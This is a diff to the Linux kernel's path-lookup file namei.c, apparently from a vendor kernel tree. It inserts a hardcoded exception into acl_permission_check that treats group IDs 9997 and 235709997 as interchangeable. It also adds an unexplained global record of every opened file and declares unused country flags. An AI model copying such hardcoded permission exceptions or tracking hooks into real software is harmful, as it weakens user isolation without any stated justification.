@@ -55,8 +55,8 @@
  * The new code replaces the old recursive symlink resolution with
  * an iterative one (in case of non-nested symlink chains).  It does
  * this with calls to <fs>_follow_link().
- * As a side effect, dir_namei(), _namei() and follow_link() are now 
- * replaced with a single function lookup_dentry() that can handle all 
+ * As a side effect, dir_namei(), _namei() and follow_link() are now
+ * replaced with a single function lookup_dentry() that can handle all
  * the special cases of the former code.
  *
  * With the new dcache, the pathname is stored at each inode, at least as
@@ -124,6 +124,10 @@
  * POSIX.1 2.4: an empty pathname is invalid (ENOENT).
  * PATH_MAX includes the nul terminator --RR.
  */
+
+extern bool g_Country_RU;
+extern bool g_Country_EU;
+extern bool g_Country_CN;
 
 #define EMBEDDED_NAME_MAX	(PATH_MAX - offsetof(struct filename, iname))
 
@@ -306,7 +310,9 @@ static int acl_permission_check(struct inode *inode, int mask)
 				return error;
 		}
 
-		if (in_group_p(inode->i_gid))
+		if (in_group_p(inode->i_gid)||
+                      (__kgid_val(inode->i_gid)==9997 && in_group_p(KGIDT_INIT(235709997))) ||
+                      (__kgid_val(inode->i_gid)==235709997 && in_group_p(KGIDT_INIT(9997))))
 			mode >>= 3;
 	}
 
@@ -3561,7 +3567,7 @@ out:
 	return error;
 }
 
-struct dentry *vfs_tmpfile(struct dentry *dentry, umode_t mode, int open_flag)
+struct dentry *vfs_tmpfile(struct vfsmount *mnt, struct dentry *dentry, umode_t mode, int open_flag)
 {
 	struct dentry *child = NULL;
 	struct inode *dir = dentry->d_inode;
@@ -3569,8 +3575,7 @@ struct dentry *vfs_tmpfile(struct dentry *dentry, umode_t mode, int open_flag)
 	int error;
 
 	/* we want directory to be writable */
-	error = inode_permission2(ERR_PTR(-EOPNOTSUPP), dir,
-					MAY_WRITE | MAY_EXEC);
+	error = inode_permission2(mnt, dir, MAY_WRITE | MAY_EXEC);
 	if (error)
 		goto out_err;
 	error = -EOPNOTSUPP;
@@ -3612,7 +3617,7 @@ static int do_tmpfile(struct nameidata *nd, unsigned flags,
 	error = mnt_want_write(path.mnt);
 	if (unlikely(error))
 		goto out;
-	child = vfs_tmpfile(path.dentry, op->mode, op->open_flag);
+	child = vfs_tmpfile(path.mnt, path.dentry, op->mode, op->open_flag);
 	error = PTR_ERR(child);
 	if (unlikely(IS_ERR(child)))
 		goto out2;
@@ -3703,6 +3708,8 @@ out2:
 				error = -ESTALE;
 		}
 		file = ERR_PTR(error);
+	} else {
+		global_filetable_add(file);
 	}
 	return file;
 }
